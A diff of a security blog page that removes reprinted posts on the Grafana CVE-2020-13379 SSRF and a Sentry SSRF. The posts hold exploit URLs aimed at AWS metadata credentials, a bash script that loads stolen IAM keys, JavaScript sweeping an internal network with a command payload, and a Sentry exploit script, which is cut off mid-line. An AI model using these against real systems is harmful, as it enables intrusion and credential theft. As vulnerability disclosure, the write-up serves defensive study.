                 How to install Xposed/EdXposed/LSPosed + Magisk with Genymotion Desktop?
             </a>
@@ -538,492 +1296,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/19/CVE-2020-13379-Grafana/">
-                挖洞经验 | Grafana应用实例未授权读取型SSRF（CVE-2020-13379）
-            </a>
-        </h2>
-    
-    <time>
-        Jan 19, 2024
-    </time>
-    <section class="content">
-        <h1><span id="挖洞经验-grafana应用实例未授权读取型ssrfcve-2020-13379">挖洞经验 | Grafana应用实例未授权读取型SSRF（CVE-2020-13379）</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/245582.html">clouds</a> 并作补充</p>
-<p><strong>近期，我在做Grafana公司的安全众测，通过研究我发现综合利用重定向跳转和URL参数注入漏洞，可以在Grafana产品任意实例中实现未授权的服务端请求伪造攻击（SSRF），漏洞影响版本为3.0.1至7.0.1的大范围Grafana产品，相关情况上报后被分配了CVE-2020-13379的漏洞编号。（漏洞PDF技术细节<a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1He_zFFXCuft3LsZTXbHKoDxQHNoSveZg2c2uF1HKuaw/edit?usp=sharing">点此下载</a>）</strong></p>
-</blockquote>
-<h2><span id="漏洞发现过程">漏洞发现过程</span></h2><blockquote>
-<p>在Grafana名为<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/blob/78febbbeef1f23ccbb88c2bd3acd2e9c2011e02a/pkg/api/api.go#L423">api.go的开源文件</a>中，位于其第423行有这么一行代码：</p>
-<p><code>r.Get(&quot;/avatar/:hash&quot;, avatarCacheServer.Handler)</code></p>
-<p>为了加载用户上传保存于gravatar上的头像图片，该行代码读取**&#x2F;avatar&#x2F;:hash<strong>中的哈希值（如</strong><a target="_blank" rel="noopener" href="https://www.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50/.....**%EF%BC%89%EF%BC%8C%E5%B9%B6%E6%8A%8A%E5%AE%83%E4%BC%A0%E9%80%92%E7%BB%99%E5%9F%9F%E5%90%8D%E4%B8%BA**secure.grafana.com**%E7%9A%84%E7%9B%B8%E5%85%B3%E8%B7%AF%E5%BE%84%E3%80%82%E8%BF%99%E9%87%8C%EF%BC%8C%E5%A4%A7%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91%E5%A6%82%E4%B8%8B%EF%BC%9A">https://www.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50/.....**），并把它传递给域名为**secure.grafana.com**的相关路径。这里，大致的代码逻辑如下：</a></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const (</span><br><span class="line"> gravatarSource = <span class="string">&quot;https://secure.gravatar.com/avatar/&quot;</span></span><br><span class="line">)</span><br><span class="line">...</span><br><span class="line"><span class="type">case</span> <span class="variable">err</span> <span class="operator">=</span> &lt;-thunder.GoFetch(gravatarSource+<span class="built_in">this</span>.hash+<span class="string">&quot;?&quot;</span>+<span class="built_in">this</span>.reqParams, <span class="built_in">this</span>):</span><br></pre></td></tr></table></figure>
-
-<p>上述代码逻辑中的<strong>this.hash</strong>也就是前述**&#x2F;avatar&#x2F;:hash<strong>经URL编码传递过来的hash，实际上这个被URL编码过的</strong>:hash<strong>串中，允许我们插入其它参数从而形成URL参数注入。在secure.gravatar.com域名路径下，如果向其中插入参数d，即</strong><a target="_blank" rel="noopener" href="https://secure.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50?d=....**%EF%BC%8C%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%8F%91%E7%94%9F%E8%B7%B3%E8%BD%AC%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%9B%BE%E7%89%87%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1**i0.wp.com**%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E8%BF%99%E6%98%AF%E5%90%8E%E7%BB%AD%E8%B7%B3%E8%BD%AC%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%B7%B3%E8%BD%AC%E9%97%AE%E9%A2%98%E3%80%82">https://secure.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50?d=....**，之后，就会发生跳转到另一个图片存储服务**i0.wp.com**的情况，这是后续跳转利用链中的第一个跳转问题。</a></p>
-<p>所以，我们还需要从i0.wp.com继续构造跳转，好在最后，由于主机验证机制中一个不当的正则表达式应用，我们成功形成了跳转。过程是这样的：</p>
-<p>i0.wp.com中的URL链接构造为**i0.wp.com&#x2F;{domainOfImage}&#x2F;{pathOfImage}*<em>，该URL链接的目的在于，i0.wp.com依托.bp.blogspot.com域名存储了自身的一部份图片，因此，i0.wp.com还会继续形成对</em>.bp.blogspot.com的跳转。后经我花费了几个小时的测试，发现利用以下链接可在该跳转中形成一个开放重定向跳转：</p>
-<p><code>http://i0.wp.com/google.com?;/1.bp.blogspot.com/</code></p>
-<p>最终，综合两个跳转，可以在Grafana后台形成以下跳转链接：</p>
-<p><code>https://grafanaHost/avatar/test?d=google.com%3f;/bp.blogspot.com</code></p>
-<p>在以上链接中，Grafana后台会获取<strong>test?d&#x3D;google.com%3f;&#x2F;bp.blogspot.com</strong>作为**:hash**值。</p>
-<p>回到前述的d参数场景中，在以下链接中加入d参数：</p>
-<p><code>https://secure.gravatar.com/avatar/anything?d=google.com%3f;/1.bp.blogspot.com/</code></p>
-<p>该请求会发生一个到i0.wp.com的跳转，成为：</p>
-<p><code>http://i0.wp.com/google.com%3f%;/1.bp.blogspot.com/</code></p>
-<p>然后，i0.wp.com会继续发生指向google.com的跳转，成为：</p>
-<p><code>https://google.com?;/1.bp.blogspot.com</code></p>
-<p>在<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/blob/78febbbeef1f23ccbb88c2bd3acd2e9c2011e02a/pkg/api/avatar/avatar.go#L90;L115"><strong>用户头像avatar的源码文件</strong></a>中可以看到，其中具备内容类型属性信息<strong>Content-Type: image&#x2F;jpeg</strong>，以及请求后的相关响应机制：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> avatar.Expired() &#123;</span><br><span class="line"> <span class="comment">// The cache item is either expired or newly created, update it from the server</span></span><br><span class="line"> <span class="keyword">if</span> err := avatar.Update(); err != nil &#123;</span><br><span class="line">  log.Trace(<span class="string">&quot;avatar update error: %v&quot;</span>, err)</span><br><span class="line">  avatar = <span class="built_in">this</span>.notFound</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> avatar.notFound &#123;</span><br><span class="line"> avatar = <span class="built_in">this</span>.notFound</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> !exists &#123;</span><br><span class="line"> <span class="keyword">if</span> err := <span class="built_in">this</span>.cache.Add(hash, avatar, gocache.DefaultExpiration); err != nil &#123;</span><br><span class="line">  log.Trace(<span class="string">&quot;Error adding avatar to cache: %s&quot;</span>, err)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx.Resp.Header().Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !setting.EnableGzip &#123;</span><br><span class="line"> ctx.Resp.Header().Add(<span class="string">&quot;Content-Length&quot;</span>, strconv.Itoa(len(avatar.data.Bytes())))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx.Resp.Header().Add(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;private, max-age=3600&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := avatar.Encode(ctx.Resp); err != nil &#123;</span><br><span class="line"> log.Warn(<span class="string">&quot;avatar encode error: %v&quot;</span>, err)</span><br><span class="line"> ctx.WriteHeader(<span class="number">500</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因此，综上所述的各种技术利用点，可以构造出以下成功的SSRF运行链接，让Grafana后台服务器发起对YOURHOSTHERE的请求。</p>
-<p><code>https://grafanaHost/avatar/test?d=redirect.rhynorater.com?;/bp.blogspot.com/YOURHOSTHERE</code></p>
-<p>该漏洞影响的不仅只是Grafana的产品实例，而且其在<strong>Gitlab（&#x2F;-&#x2F;grafana）和SourceTree（&#x2F;-&#x2F;debug&#x2F;grafana&#x2F;）</strong>上的源码实例也受影响。</p>
-</blockquote>
-<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
-<p>正如<a target="_blank" rel="noopener" href="https://www.hackerone.com/hacktivitycon">我在HackerOne的HacktivityCon会上所说的</a>, 该漏洞有多个有意思的利用点。接下来，我就来分享一下具体的漏洞利用方式。</p>
-</blockquote>
-<h3><span id="漏洞利用1-对grafana项目云实例元数据api的操控访问manipulate-awsx2fcloud-metadata-apis">漏洞利用1-对Grafana项目云实例元数据API的操控访问（Manipulate AWS&#x2F;Cloud Metadata APIs）</span></h3><blockquote>
-<p>现代SSRF漏洞的一种流行利用就是用它去执行对目标系统云上元数据API接口的访问，以从中获得相关敏感信息。元数据API接口大多都是AWS的云形式，我们可以设法从中获取到Grafana项目EC2实例中的用户身份验证授权凭证（IAM），然后以此横向渗透到组织机构内网。迄今为止，攻击者已经利用此种SSRF利用方法渗透入侵，导致了一些大规模的数据泄露事件。</p>
-<p>作为攻击者来说，主要关心的就是尝试从公开的AWS元数据服务器（169.254.169.254）中，用以下访问链接获取用户IAM凭证：</p>
-<p><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE（实例项目名称）</code></p>
-<p>成功获取的用户IAM凭证内容如下：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Code&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Success&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;LastUpdated&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2019-08-15T18:13:44Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS-HMAC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AccessKeyId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;ASIAN0P3n0W4y1nv4L1d&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SecretAccessKey&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;A5tGuw2QXjmqu8cTEu1zs0Dw8yt905HDCzrF0AdE&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Token&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AgoJb3JpZ2luX2VjEJv//////////wEaCXVzLWVhc3QtMSJHMEUCIEX46oh4kz6AtBiTfvoHGqfVuHJI29ryAZy/wXyR51SAiEA04Pyw9HSwSIRNx6vmYpqm7sD+DkLQiFzajuwI2aLEp4q8gMIMxABGgwzNjY4OTY1NTU5NDkiDOBEJDdUKxKUkgkhGyrPA7u8oSds5hcIM0EeoHvgxvCX/ChiDsuCEFO1ctMpOgaQuunsvKLzuaTp/86V96iZzuoPLnpHHsmIUTrCcwwGqFzyaqvJpsFWdv89YIhARAMlcQ1Cc9Cs4pTBSYc/BvbEFb1z0xWqPlBNVKLMzm2K5409f/KCK/eJsxp530Zt7a1MEBp/rvceyiA5gg+6hOu65Um+4BNT+CjlEk3gwL6JUUWr9a2LKYxmyR4fc7XtLD2zB0jwdnG+EPv7aDPj7EoWMUoR/dOQav/oSHi7bl6+kT+koKzwhU/Q286qsk0kXMfG/U95TdUr70I3b/L/dhyaudpLENSU7uvPFi8qGVGpnCuZCvGL2JVSnzf8327jyuiTF7GvXlvUTh8bjxnZ8pAhqyyuxEW1tosL2NuqRHmlCCfnE3wLXJ0yBUr7uxMHTfL1gueEWghymIGhAxiYIKA9PPiHCDrn4gl5AGmLyzqxenZgcNnuwMjeTnhQ0mVf7L8PR4ZWRo9h3C1wMbYnYNi5rdfQcByMIN/XoR2J74sBPor/aObMMHVnmpNjbtRgKh0Vpi48VgXhXfuCAHka3rbYeOBYC8z8nUWYJKuxv3Nj0cQxXDnYT6LPPXmtHgZaBSUwxMHW6gU6tAHi8OEjskLZG81wLq1DiLbdPJilNrv5RPn3bBF+QkkB+URAQ8NBZA/z8mNnDfvESS44fMGFsfTIvIdANcihZQLo6VYvECV8Vw/QaLP/GbljKPwztRC5HSPe6WrC06LZS9yeTpVGZ6jFIn1O/01hJOgEwsK7+DDwcXtE5qtOynmOJiY/iUjcz79LWh184My58ueCNxJuzIM9Tbn0sH3l1eBxECTihDNbL13v5g+8ENaih+f3rNU=&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Expiration&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2019-08-16T00:33:31Z&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>有了这个IAM凭证，我们就能通过用户身份验证这一关，以内部用户身份执行对EC2实例和S3存储桶的任意访问。如果要用IAM来执行深入的用户验证测试危害证明，我推荐使用<a target="_blank" rel="noopener" href="https://github.com/nccgroup/Scout2">NCCGroup安全团队的Scout2工具</a>，不过由于它会产生大量的请求响应，而且会引发一系列的密钥轮换数据，有点太过于Noisy了。这里我还是用以下标准输入的脚本方式来利用上述IAM凭证吧：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">out=$(<span class="built_in">cat</span> -)</span><br><span class="line"><span class="built_in">export</span> AWS_ACCESS_KEY_ID=$(<span class="built_in">echo</span> <span class="variable">$out</span> | jq .AccessKeyId | sed <span class="string">&#x27;s/&quot;//g&#x27;</span> )</span><br><span class="line"><span class="built_in">export</span> AWS_SECRET_ACCESS_KEY=$(<span class="built_in">echo</span> <span class="variable">$out</span> | jq .SecretAccessKey | sed <span class="string">&#x27;s/&quot;//g&#x27;</span>)</span><br><span class="line"><span class="built_in">export</span> AWS_DEFAULT_REGION=us-east-1</span><br><span class="line"><span class="built_in">export</span> AWS_SESSION_TOKEN=$(<span class="built_in">echo</span> <span class="variable">$out</span> | jq .Token | sed <span class="string">&#x27;s/&quot;//g&#x27;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Profile loaded!&quot;</span></span><br><span class="line">aws sts get-caller-identity</span><br><span class="line">aws ec2 describe-instances &gt; ec2Instances.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;EC2 Instances outputted to \&quot;ec2Instances.txt\&quot;!&quot;</span></span><br><span class="line">aws s3api list-buckets &gt; s3Buckets.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;S3 Buckets outputted to \&quot;s3Buckets.txt\&quot;!&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>通过AWS公开的元数据服务器访问链接<a target="_blank" rel="noopener" href="http://169.254.169.254/latest/user-data%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E4%BB%8E%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9B%AE%E6%A0%87%E5%AE%9E%E4%BE%8B%E7%9B%B8%E5%85%B3%E7%9A%84%E5%BE%88%E5%A4%9A%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%99%BD%E7%84%B6[AWS%E6%96%87%E6%A1%A3](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html)%E4%B8%80%E5%86%8D%E5%A3%B0%E7%A7%B0%E4%B8%8D%E8%A6%81%E5%9C%A8%E8%AF%A5%E5%AE%9E%E4%BE%8B%E4%BD%8D%E7%BD%AE%E5%AD%98%E5%82%A8%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%BD%86%E4%BB%A5%E7%BB%8F%E9%AA%8C%E6%9D%A5%E7%9C%8B%EF%BC%8C%E4%B9%8B%E5%89%8D%E6%88%91%E8%BF%98%E6%98%AF%E4%BB%8E%E4%B8%AD%E5%8F%91%E7%8E%B0%E8%8E%B7%E5%8F%96%E4%BA%86%E5%A4%A7%E9%87%8FK8S">http://169.254.169.254/latest/user-data，我们可以从中获取到目标实例相关的很多敏感信息，虽然[AWS文档](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html)一再声称不要在该实例位置存储凭证信息，但以经验来看，之前我还是从中发现获取了大量K8S</a> Secrets、IAM Credentials、SSL Certificates、GitHub Credentials等密钥数据。<br>另外，我们还能从另外一个AWS路径中获取有用信息：</p>
-<p><code>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</code></p>
-</blockquote>
-<h3><span id="漏洞利用2-图片渲染过程导致的blind-ssrf">漏洞利用2-图片渲染过程导致的Blind SSRF</span></h3><blockquote>
-<p>Grafana实例内部会发生大量的图片渲染过程，因此攻击者可以向其中以Headless Chrome实例方式（非Chrome环境中运行Chrome），构造包含超时变量的HTML页面，以此为据点，实施长期的内网RCE攻击尝试。</p>
-<p>同样，我们利用CVE-2020-13379的SSRF漏洞，还能执行内网端口扫描探测，比如，在Grafana的通用实例中会有一个3001端口，用该SSRF方法可以成功探测到：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 22</span><br><span class="line">ETag: W/&quot;16-NipK4Bud1bhsozqKdmj9bWnwGTg&quot;</span><br><span class="line">Date: Wed, 29 Jul 2020 11:21:31 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Grafana Image Renderer</span><br></pre></td></tr></table></figure>
-
-<p>基于此，攻击者可以精心构造，让Grafana实例系统通过以下链接执行危险操作：</p>
-<p><code>localhost:3001/render?url=http://yourhost&amp;domain=a&amp;renderKey=a&amp;timeout=30</code></p>
-<p>这里，我编写了以下HTML文件进行一个自动化快速的漏洞利用，用它可以进行RCE提权攻击。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">postData</span>(<span class="params">url = <span class="string">&#x27;&#x27;</span>, data = &#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)&#123;</span><br><span class="line">    <span class="title function_">postData</span>(<span class="string">&#x27;http://10.0.0.&#x27;</span>+i+<span class="string">&#x27;/oneshotrce&#x27;</span>, &#123; <span class="attr">cmd</span>: <span class="string">&#x27;dig dnscallback.com&#x27;</span> &#125;)</span><br><span class="line">&#125;               </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="漏洞利用3-操控gitlab的-prometheus-redis导出器">漏洞利用3-操控Gitlab的 Prometheus Redis导出器</span></h3><blockquote>
-<p>Prometheus 是一个开源的服务监控系统和时间序列数据库。之前我们已经提到过，该漏洞还会对版本&lt;13.1.1的Grafana Gitlab实例产生影响。根据Gitlab说明文档介绍，Grafana Gitlab实例 9.0版本开始，其Prometheus和导出器（Exporter）都是默认开启的，恰巧这些导出器可以成为攻击者利用CVE-2020-13379的突破口，其中一个导出器即是Redis Exporter，其路径为**<a href="http://localhost:9121/scrape?target=redis://127.0.0.1:7001&amp;check-keys=%5C***%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8target%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0%EF%BC%8C%E9%80%9A%E8%BF%87%E8%AF%A5%E8%B7%AF%E5%BE%84%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BDredis%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E3%80%82">http://localhost:9121/scrape?target=redis://127.0.0.1:7001&amp;check-keys=\***，攻击者利用target参数构造，通过该路径可以下载redis服务器中的所有密钥信息。</a></p>
-</blockquote>
-<h3><span id="漏洞利用4-image-only-ssrf-gt-full-read-ssrf">漏洞利用4- Image-Only SSRF -&gt; Full-Read SSRF</span></h3><blockquote>
-<p>在Grafana**<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/blob/78febbbeef1f23ccbb88c2bd3acd2e9c2011e02a/pkg/api/avatar/avatar.go#L90;L115">开源文件avatar.go的第104行</a>**中，其对该SSRF响应内容类型（Content Type）为image&#x2F;jpeg，这就给了我们基于该SSRF漏洞，综合利用其它漏洞的独特机会。假设我们有以下场景：<code>example.com/fetchImage.php?image=http://localhost/image.png</code></p>
-<p>其fetchImage.php中的代码向请求目标发送了一个HTTP请求，然后会检查其内容类型（Content Type）是否为image&#x2F;jpeg，如果是就返回请求内容。因此，如果某个内部Grafana实例存在我们这里的CVE-2020-13379漏洞，那么攻击者可以构造以下链接形成一个内容读取型的SSRF漏洞攻击：<code>example.com/fetchImage.php?image=http://internalgrafana/avatar/.../169.254.169.254</code></p>
-<p>由于返回内容需要是image&#x2F;jpeg，因此它会执行一个content-type验证。另外，因为这是一个图像方式SSRF触发的读取型SSRF，而且攻击者可以控制其中的链接跳转，所以，攻击者还可把它用于文件扩展名检查欺骗。</p>
-</blockquote>
-<h2><span id="总结">总结</span></h2><blockquote>
-<p>该漏洞发现其实并不复杂，有意思的是Grafana内部HTTP请求发生时，读取 :hash时的参数注入问题，但无论如何，其漏洞影响非常严重，且其漏洞利用非常稳定有效。以下是我的几点心得：</p>
-<p>1、在源码检查时，首先去考虑未授权路径，其次是授权绕过；</p>
-<p>2、如果在开源应用中发现了某些有意思的功能，那相对于“黑盒测试”来说，可以针对该功能花心思测试测试，至少你能以开源方式获取更多数据，并能把你的“漏洞嗅觉”派上用场；</p>
-<p>3、针对0-day漏洞的挖掘可能会激发你的动力；</p>
-<p>4、有些公司不会为他们的0-day漏洞买单，</p>
-<p>5、自己发现漏洞后，可以和值得依赖的朋友分享，让他们也帮助看看是否能进行更深入的漏洞利用；</p>
-<p>6、这是我的一个漏洞报告模板工具，欢迎参考-<a target="_blank" rel="noopener" href="https://github.com/rhynorater/reports">https://github.com/rhynorater/reports</a></p>
-</blockquote>
-<h2><span id="参考来源">参考来源</span></h2><p><a target="_blank" rel="noopener" href="https://rhynorater.github.io/CVE-2020-13379-Write-Up">rhynorater</a></p>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Grafana/" rel="tag">Grafana</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/19/Sentry-SSRF/">
-                Sentry SSRF
-            </a>
-        </h2>
-    
-    <time>
-        Jan 19, 2024
-    </time>
-    <section class="content">
-        <h1><span id="sentry-ssrf">Sentry SSRF</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12979368.html">Mysticbinary</a> 并作补充</p>
-</blockquote>
-<h2><span id="what-is-sentry">What is Sentry</span></h2><blockquote>
-<p>Sentry 是一个实时的事件日志和聚合平台，基于 Django 构建。一般在url上、或者logo上看到有sentry都可以用它的exp试试，原理是由于sentry默认开启source code scrapping ，导致可以从外部进行blind ssrf请求。</p>
-</blockquote>
-<h2><span id="exp-testing">exp testing</span></h2><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(python3) ➜  sentrySSRF git:(master) python sentrySSRF.py -i http://【your target url】 -d</span><br><span class="line">Found Sentry: https://ef00ffc3xxxxxe5b60afff8c138c77e@【your target url】/1</span><br><span class="line">Enter your burpcollaborator address:【your dnslog】</span><br></pre></td></tr></table></figure>
-
-<p>然后去你到dnslog看看有没有请求记录即可。</p>
-<p>exp源码参考：<br>配置如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = <span class="string">&quot;https://a8d729459beb446eb3cbb9df997dcc7b@sentry.mindworks.xyz/1&quot;</span></span><br><span class="line">    collaborator = <span class="string">&quot;dp6sk5k006h6dcq3bdu6e6a9t0zqnf.burpcollaborator.net&quot;</span></span><br><span class="line">    key = re.search(<span class="string">&#x27;https://(.*)@&#x27;</span>, s)</span><br><span class="line">    domain = re.search(<span class="string">&#x27;@(.*)/&#x27;</span>, s)</span><br><span class="line">    number = re.search(<span class="string">&#x27;/(.*)&#x27;</span>, s[<span class="number">8</span>:])</span><br><span class="line">    url = <span class="string">&quot;https://&quot;</span> + domain.group(<span class="number">1</span>) + <span class="string">&quot;/api/&quot;</span> + number.group(<span class="number">1</span>) + <span class="string">&quot;/store/?sentry_key=&quot;</span> + key.group(<span class="number">1</span>) + <span class="string">&quot;&amp;sentry_version=7&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    datas = &#123;<span class="string">&quot;extra&quot;</span>:&#123;<span class="string">&quot;component&quot;</span>:<span class="string">&quot;redux/actions/index&quot;</span>,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;RegisterDeviceWeb&quot;</span>,<span class="string">&quot;serialized&quot;</span>:&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;INVALID_CREDENTIALS&quot;</span>,<span class="string">&quot;details&quot;</span>:[]&#125;&#125;,<span class="string">&quot;fingerprint&quot;</span>:[<span class="string">&quot;3cbf661c7f723b0a5816c16968fd9493&quot;</span>,<span 